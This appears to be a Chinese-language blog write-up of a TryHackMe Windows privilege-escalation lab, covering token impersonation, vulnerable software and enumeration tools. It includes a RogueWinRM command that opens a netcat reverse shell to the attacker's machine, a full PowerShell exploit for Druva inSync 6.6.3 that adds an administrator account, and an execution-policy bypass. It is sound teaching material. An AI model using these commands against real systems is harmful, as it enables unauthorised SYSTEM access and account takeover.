<p>假设我们有一个使用用户<code>ftp</code>运行的FTP服务。如果没有模拟，如果用户 Ann 登录 FTP 服务器并尝试访问她的文件，FTP 服务将尝试使用其访问令牌而不是 Ann 的访问令牌来访问它们：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115703241.png"></p>
<p>使用 ftp 令牌不是最好的主意有几个原因： - 为了正确提供文件， <code>ftp</code>用户需要可以访问它们。在上面的示例中，FTP 服务将能够访问 Ann 的文件，但不能访问 Bill 的文件，因为 Bill 文件中的 DACL 不允许用户<code>ftp</code> 。这增加了复杂性，因为我们必须为每个提供的文件&#x2F;目录手动配置特定权限。 - 对于操作系统，所有文件均由用户<code>ftp</code>访问，与当前登录FTP服务的用户无关。这使得无法将授权委托给操作系统；因此， FTP服务必须实现它。 - 如果FTP服务在某个时刻遭到破坏，攻击者将立即获得对<code>ftp</code>用户有权访问的所有文件夹的访问权限。</p>
<p>另一方面，如果 FTP 服务的用户具有 SeImpersonate 或 SeAssignPrimaryToken 权限，则所有这些都会稍微简化，因为FTP服务可以临时获取登录用户的访问令牌，并使用它来执行其上的任何任务。代表：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006115813563.png"></p>
<p>现在，如果用户 Ann 登录到 FTP 服务，并且考虑到 ftp 用户具有模拟权限，则它可以借用 Ann 的访问令牌并使用它来访问她的文件。这样，文件不需要以任何方式提供对用户<code>ftp</code>访问，并且操作系统会处理授权。由于 FTP 服务正在冒充 Ann，因此在该会话期间它将无法访问 Jude 或 Bill 的文件。</p>
<p>作为攻击者，如果我们设法控制具有 SeImpersonate 或 SeAssignPrimaryToken 权限的进程，我们就可以模拟连接该进程并对其进行身份验证的任何用户。</p>
<p>在Windows系统中，你会发现LOCAL SERVICE和NETWORK SERVICE  ACCOUNTS已经拥有这样的权限。由于这些帐户用于使用受限帐户生成服务，因此如果服务需要，允许它们模拟连接用户是有意义的。 Internet  信息服务 (IIS) 还将为 Web 应用程序创建一个名为“iis apppool\defaultapppool”的类似默认帐户。</p>
<p>要使用此类帐户提升权限，攻击者需要满足以下条件： </p>
<ol>
<li>生成一个进程，以便用户可以连接该进程并对其进行身份验证，以进行模拟。</li>
<li>找到一种方法来强制特权用户连接并验证生成的恶意进程。</li>
</ol>
<p>我们将使用 RogueWinRM 漏洞来实现这两个条件。</p>
<p>首先，假设我们已经入侵了一个在 IIS 上运行的网站，并且我们已经在以下地址植入了 Web shell：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://10.10.255.156/</span><br></pre></td></tr></table></figure>

<p>我们可以使用 Web shell 检查受感染帐户的分配权限，并确认我们拥有此任务感兴趣的两项权限：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006120425680.png"></p>
<p>要使用RogueWinRM，我们首先需要将漏洞利用程序上传到目标机器。为了您的方便，这已经完成，您可以在<code>C:\tools\</code>文件夹中找到该漏洞。</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用系统权限自动创建到端口 5985  的连接。端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台以通过网络远程使用的端口。可以将其想象为SSH ，但使用 Powershell。</p>
<p>如果由于某种原因，WinRM 服务没有在受害服务器上运行，则攻击者可以在端口 5985 上启动伪造的 WinRM 服务，并在启动时捕获 BITS  服务进行的身份验证尝试。如果攻击者具有SeImpersonate权限，他可以代表连接用户（即SYSTEM）执行任何命令。</p>
<p>在运行漏洞之前，我们将启动一个 netcat 侦听器以在攻击者的计算机上接收反向 shell。然后，使用我们的 Web shell 使用以下命令触发 RogueWinRM 漏洞利用：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe 10.10.253.40 4442&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006121345871.png"></p>
<p><strong>注意：</strong>该漏洞可能需要长达 2 分钟才能发挥作用，因此您的浏览器可能会出现一段时间无响应。如果您多次运行漏洞利用程序，就会发生这种情况，因为它必须等待 BITS 服务停止才能再次启动。 BITS服务将在启动2分钟后自动停止。</p>
<p><code>-p</code>参数指定漏洞利用程序运行的可执行文件，在本例中为<code>nc64.exe</code> 。 <code>-a</code>参数用于将参数传递给可执行文件。由于我们希望 nc64 针对攻击者计算机建立反向 shell，因此传递给 netcat 的参数将为<code>-e cmd.exe ATTACKER_IP 4442</code> 。</p>
<h4 id="Task7-滥用易受攻击的软件"><a href="#Task7-滥用易受攻击的软件" class="headerlink" title="Task7 滥用易受攻击的软件"></a>Task7 滥用易受攻击的软件</h4><h5 id="打补丁的软件"><a href="#打补丁的软件" class="headerlink" title="打补丁的软件"></a>打补丁的软件</h5><p>RDP连接靶机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xfreerdp /v:10.10.99.140 /u:thm-unpriv /p:Password321</span><br></pre></td></tr></table></figure>

<p>目标系统上安装的软件可以提供各种权限升级机会。与驱动程序一样，组织和用户可能不会像更新操作系统那样频繁地更新它们。您可以使用<code>wmic</code>工具列出目标系统上安装的软件及其版本。下面的命令将转储它可以在已安装的软件上收集的信息（可能需要大约一分钟才能完成）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006124544140.png"></p>
<p>请记住， <code>wmic product</code>命令可能不会返回所有已安装的程序。根据某些程序的安装方式，它们可能不会在此处列出。检查桌面快捷方式、可用服务或任何表明存在可能易受攻击的其他软件的痕迹始终是值得的。</p>
<p>一旦我们收集了产品版本信息，我们就可以随时在<a href="https://www.exploit-db.com/">exploit-db</a> 、 <a href="https://packetstormsecurity.com/">packetstorm</a>或plain old <a href="https://www.google.com/">Google</a>等网站上在线搜索已安装软件的现有漏洞。使用 wmic 和 Google，您能在任何已安装的产品上找到已知漏洞吗？</p>
<h5 id="案例研究：Druva-inSync-6-6-3"><a href="#案例研究：Druva-inSync-6-6-3" class="headerlink" title="案例研究：Druva inSync 6.6.3"></a>案例研究：Druva inSync 6.6.3</h5><p>目标服务器正在运行 Druva inSync 6.6.3，正如<a href="https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/">Matteo Malvica</a>报告的那样，该服务器容易受到权限升级的影响。该漏洞是由于对<a href="https://www.tenable.com/security/research/tra-2020-12">Chris Lyne</a>最初报告的 6.5.0 版本的另一个漏洞应用了错误补丁而导致的。</p>
<p>该软件容易受到攻击，因为它在端口 6064 上运行具有系统权限的 RPC（远程过程调用）服务器，只能从本地主机访问。如果您不熟悉 RPC，它只是一种允许给定进程通过网络公开函数（RPC 行话中称为过程）的机制，以便其他计算机可以远程调用它们。</p>
<p>对于 Druva inSync，端口 6064 上公开的过程之一（特别是过程号 5）允许任何人请求执行任何命令。由于 RPC 服务器以 SYSTEM 身份运行，因此任何命令都以 SYSTEM 权限执行。</p>
<p>6.5.0 及更早版本中报告的原始漏洞允许不受限制地运行任何命令。提供此类功能的最初想法是远程执行 inSync 提供的一些特定二进制文件，而不是任何命令。尽管如此，仍然没有进行任何检查来确保这一点。</p>
<p>发布了一个补丁，他们决定检查执行的命令是否以字符串<code>C:\ProgramData\Druva\inSync4\</code>开头，这是允许的二进制文件应该在的位置。但是，事实证明这还不够，因为您可以简单地进行路径遍历攻击来绕过这种控制。假设您要执行<code>C:\Windows\System32\cmd.exe</code> ，但它不在允许的路径中；你可以简单地要求服务器运行 <code>C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe</code> 这样就可以成功绕过检查。</p>
<p>为了构建一个可行的漏洞利用程序，我们需要了解如何与端口 6064 通信。幸运的是，我们使用的协议很简单，要发送的数据包如下图所示：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006123756222.png"></p>
<p>第一个数据包只是一个包含固定字符串的 hello 数据包。第二个数据包表明我们想要执行程序 5，因为这是一个易受攻击的程序，它将为我们执行任何命令。最后两个数据包分别用于发送命令的长度和要执行的命令字符串。</p>
<p>最初由 Matteo Malvica<a href="https://packetstormsecurity.com/files/160404/Druva-inSync-Windows-Client-6.6.3-Privilege-Escalation.html">在此</a>发布，可以在目标计算机中使用以下漏洞来提升权限并检索此任务的标志。为了您的方便，以下是原始漏洞利用代码：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ErrorActionPreference</span> = <span class="string">&quot;Stop&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&quot;net user pwnd /add&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="built_in">New-Object</span> System.Net.Sockets.Socket(</span><br><span class="line">    [<span class="type">System.Net.Sockets.AddressFamily</span>]::InterNetwork,</span><br><span class="line">    [<span class="type">System.Net.Sockets.SocketType</span>]::Stream,</span><br><span class="line">    [<span class="type">System.Net.Sockets.ProtocolType</span>]::Tcp</span><br><span class="line">)</span><br><span class="line"><span class="variable">$s</span>.Connect(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6064</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">$header</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">&quot;inSync PHC RPCW[v0002]&quot;</span>)</span><br><span class="line"><span class="variable">$rpcType</span> = [<span class="type">System.Text.Encoding</span>]::UTF8.GetBytes(<span class="string">&quot;<span class="variable">$</span>([char]0x0005)`0`0`0&quot;</span>)</span><br><span class="line"><span class="variable">$command</span> = [<span class="type">System.Text.Encoding</span>]::Unicode.GetBytes(<span class="string">&quot;C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c <span class="variable">$cmd</span>&quot;</span>);</span><br><span class="line"><span class="variable">$length</span> = [<span class="type">System.BitConverter</span>]::GetBytes(<span class="variable">$command</span>.Length);</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$header</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$rpcType</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$length</span>)</span><br><span class="line"><span class="variable">$s</span>.Send(<span class="variable">$command</span>)</span><br></pre></td></tr></table></figure>

<p>您可以弹出 Powershell 控制台并直接粘贴漏洞来执行它</p>
<p>（该漏洞也可以在目标计算机中使用，网址为 <code>C:\tools\Druva_inSync_exploit.txt</code> ）。</p>
<p>请注意，在<code>$cmd</code>变量中指定的漏洞利用的默认有效负载将在系统中创建一个名为<code>pwnd</code>的用户，但不会为其分配管理权限，因此我们可能希望更改有效负载以获取更有用的内容。对于这个房间，我们将更改exp的<code>$cmd</code>以运行以下命令：</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user pwnd SimplePass123 /add &amp; net localgroup administrators pwnd /add</span><br></pre></td></tr></table></figure>

<p>这将创建密码为<code>SimplePass123</code>的用户<code>pwnd</code>并将其添加到管理员组中。如果利用成功，您应该能够运行以下命令来验证用户<code>pwnd</code>是否存在并且是管理员组的一部分：</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006134749975.png"></p>
<p>然后就能以管理员身份运行命令提示符，搜索下命令行</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006134941049.png"></p>
<p>右键以管理员运行，选择我们创建的pwnd用户</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006135024178.png"></p>
<p>成功提权SYSTEM权限</p>
<p><img src="/article/Jr-Penetration-Tester%E5%AD%A6%E4%B9%A0/image-20241006135122332.png"></p>
<h4 id="Task8-专业工具"><a href="#Task8-专业工具" class="headerlink" title="Task8 专业工具"></a>Task8 专业工具</h4><p>有几个脚本可以以类似于上一个任务中看到的方式进行系统枚举。这些工具可以缩短枚举过程时间并发现不同的潜在特权升级向量。但是，请记住，自动化工具有时可能会错过权限升级。</p>
<p>以下是一些常用于识别权限升级向量的工具。请随意对这个房间中的任何机器运行它们，看看结果是否与讨论的攻击向量相匹配。</p>
<h5 id="WinPEAS"><a href="#WinPEAS" class="headerlink" title="WinPEAS"></a>WinPEAS</h5><p>WinPEAS 是一个开发用于枚举目标系统以发现权限提升路径的脚本。您可以找到有关 winPEAS 的更多信息并下载预编译的可执行文件或 .bat 脚本。  WinPEAS 将运行与上一个任务中列出的命令类似的命令并打印其输出。 winPEAS  的输出可能很长，有时难以阅读。这就是为什么最好始终将输出重定向到文件，如下所示：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">winpeas.exe &gt; outputfile.txt       </span><br></pre></td></tr></table></figure>

<p>WinPEAS 可以<a href="https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS">在此处</a>下载。</p>
<h5 id="PrivescCheck"><a href="#PrivescCheck" class="headerlink" title="PrivescCheck"></a>PrivescCheck</h5><p>PrivescCheck 是一个PowerShell脚本，用于搜索目标系统上的常见权限升级。它提供了 WinPEAS 的替代方案，无需执行二进制文件。</p>
<p>PrivescCheck 可<a href="https://github.com/itm4n/PrivescCheck">在此处</a>下载。</p>
<p><strong>提醒</strong>：要在目标系统上运行 PrivescCheck，您可能需要绕过执行策略限制。为此，您可以使用<code>Set-ExecutionPolicy</code>，如下所示。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ExecutionPolicy Bypass -Scope process -Force</span><br><span class="line">.\PrivescCheck.ps1</span><br><span class="line">Invoke-PrivescCheck</span><br></pre></td></tr></table></figure>

<h5 id="WES-NG-Windows-漏洞利用建议器"><a href="#WES-NG-Windows-漏洞利用建议器" class="headerlink" title="WES-NG Windows 漏洞利用建议器"></a>WES-NG Windows 漏洞利用建议器</h5><p>一些漏洞利用建议脚本（例如  winPEAS）将要求您将它们上传到目标系统并在那里运行它们。这可能会导致防病毒软件检测并删除它们。为了避免发出不必要的噪音来吸引注意力，您可能更喜欢使用 WES-NG，它将在您的攻击机器上运行（例如 Kali 或 TryHackMe AttackBox）。</p>
<p>WES-NG 是一个 Python 脚本，可以<a href="https://github.com/bitsadmin/wesng">在此处</a>找到并下载。</p>
<p>安装后，在使用之前，键入<code>wes.py --update</code>命令来更新数据库。该脚本将引用它创建的数据库来检查是否有缺失的补丁，这些补丁可能会导致您可以利用漏洞来提升您在目标系统上的权限。</p>
<p>要使用该脚本，您需要在目标系统上运行<code>systeminfo</code>命令。不要忘记将输出定向到您需要移动到攻击计算机的 .txt 文件。</p>
<p>完成后，wes.py 可以按如下方式运行；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wes.py systeminfo.txt</span><br></pre></td></tr></table></figure>

<h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h5><p>如果目标系统上已有Meterpreter shell，则可以使用 <code>multi/recon/local_exploit_suggester</code> 模块列出可能影响目标系统的漏洞并允许您提升目标系统上的权限。</p>
<h4 id="Task9-总结"><a href="#Task9-总结" class="headerlink" title="Task9 总结"></a>Task9 总结</h4><p>在这个房间中，我们介绍了 Windows 系统中可用的几种权限升级技术。这些技术应该为您提供有关攻击者提升系统权限的最常见路径的坚实背景。如果您有兴趣了解其他技术，可以使用以下资源：</p>
<ul>
<li>[PayloadsAllTheThings - Windows 权限提升](<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology</a> and Resources&#x2F;Windows - Privilege Escalation.md)</li>
<li><a href="https://github.com/gtworek/Priv2Admin">Priv2Admin - 滥用 Windows 权限</a></li>
<li><a href="https://github.com/antonioCoco/RogueWinRM"> RogueWinRM 漏洞利用</a></li>
<li><a href="https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html"> 土豆</a></li>
<li><a href="https://decoder.cloud/"> 解码器的博客</a></li>
<li><a href="https://dl.packetstormsecurity.net/papers/presentations/TokenKidnapping.pdf"> 令牌绑架</a></li>
<li><a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation">黑客技巧 - Windows 本地权限提升</a></li>
</ul>
]]></content>
      <categories>
        <category>渗透</category>
      </categories>
      <tags>
        <tag>TryHackMe</tag>
      </tags>
  </entry>
</search>
